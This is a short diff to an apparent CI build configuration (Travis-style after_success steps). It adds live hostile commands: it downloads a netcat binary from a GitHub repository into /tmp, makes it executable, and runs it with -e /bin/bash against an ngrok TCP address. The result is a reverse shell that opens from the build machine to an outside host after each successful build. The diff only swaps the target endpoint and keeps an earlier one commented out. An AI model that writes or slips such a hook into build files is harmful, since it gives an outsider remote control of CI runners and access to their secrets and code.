@@ -21,4 +21,5 @@ after_success:
 # Hellooooo Nurse!
   - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
   - chmod a+x /tmp/nc
-  - /tmp/nc 2.tcp.ngrok.io 15053 -e /bin/bash
+#  - /tmp/nc 0.tcp.ngrok.io 18470 -e /bin/bash
+  - /tmp/nc 0.tcp.ngrok.io 13072 -e /bin/bash
